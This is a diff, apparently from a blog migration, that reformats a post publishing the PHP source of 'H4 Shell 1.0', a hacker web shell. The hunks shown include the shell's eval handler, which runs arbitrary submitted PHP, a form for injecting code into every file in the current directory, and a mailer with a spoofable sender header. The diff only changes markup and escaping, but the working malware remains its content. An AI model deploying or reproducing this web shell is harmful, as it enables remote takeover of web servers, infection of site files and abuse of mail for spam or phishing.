@@ -18,7 +18,7 @@ Includes the following words of wisdom: &#8216;Cuz We Back Rude This Time&#8217;
 
 ### H4 Shell Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 # H4 Shell 1.0
 # c0ded by H4KOOOM
 # http://sa-hacker.com
@@ -225,8 +225,8 @@ rmdir($mydir);
 }
 // Eval
 if(isset($phpeval)) {
-$eval = @str_replace("&lt;?","",$phpeval);
-$eval = @str_replace("?&gt;","",$phpeval);
+$eval = @str_replace("<?","",$phpeval);
+$eval = @str_replace("?>","",$phpeval);
 @eval(stripslashes($eval));
 die();
 }
@@ -1183,15 +1183,15 @@ $random_hash = md5(date('r', time()));
 $headers = "From: ".$_POST['mfrom']."rnReply-To: ".$_POST['mfrom'];
 $headers .= "rnContent-Type: multipart/alternative; boundary='PHP-alt-".$random_hash."'";
 ob_start();
-?&gt;
+?>
 
---PHP-alt-&lt;?php echo $random_hash; ?&gt;
+--PHP-alt-<?php echo $random_hash; ?>
 Content-Type: text/html; charset="windows-1256"
 Content-Transfer-Encoding: 7bit
 
-&lt;?  echo "$contentz"; ?&gt;
---PHP-alt-&lt;?php echo $random_hash; ?&gt;--
-&lt;?
+<?  echo "$contentz"; ?>
+--PHP-alt-<?php echo $random_hash; ?>--
+<?
 $message = ob_get_clean();
 
 $mail = @mail( $to, $subject, $message, $headers );
@@ -1284,7 +1284,7 @@ echo "
    &lt;textarea name=php_eval cols=50 rows=4&gt;&lt;/textarea&gt;&lt;br&gt;
    &lt;input type='submit' value='äÝÐ'&gt;
    &lt;/form&gt;
-&lt;/td&gt;&lt;td valign=top&gt;&lt;center&gt;&lt;font face='Tahoma' size='2'&gt;&lt;b&gt;:: ÍÞä ßæÏ Ýí ÌãíÚ ãáÝÇÊ ãÓÇÑß ÇáÍÇáí ::&lt;/b&gt;&lt;/font&gt;&lt;form method='post' action=''&gt;&lt;textarea name='cod3inf' cols=50 rows=4&gt;&lt;?php /* ÖÚ ÇáßæÏ åäÇ */ ?&gt;&lt;/textarea&gt;&lt;br&gt;&lt;input type='submit' value='äÝÐ' name='inf3ct'&gt;&lt;br&gt;";
+&lt;/td&gt;&lt;td valign=top&gt;&lt;center&gt;&lt;font face='Tahoma' size='2'&gt;&lt;b&gt;:: ÍÞä ßæÏ Ýí ÌãíÚ ãáÝÇÊ ãÓÇÑß ÇáÍÇáí ::&lt;/b&gt;&lt;/font&gt;&lt;form method='post' action=''&gt;&lt;textarea name='cod3inf' cols=50 rows=4&gt;<?php /* ÖÚ ÇáßæÏ åäÇ */ ?>&lt;/textarea&gt;&lt;br&gt;&lt;input type='submit' value='äÝÐ' name='inf3ct'&gt;&lt;br&gt;";
 if(isset($textzz)) { echo $textzz; }
 echo "&lt;/center&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;tr&gt;
@@ -1413,5 +1413,5 @@ echo "&lt;/font&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;
 &lt;/body&gt;
 &lt;/html&gt;";
 
-?&gt;
-</pre>
+?>
+{% endhighlight %}
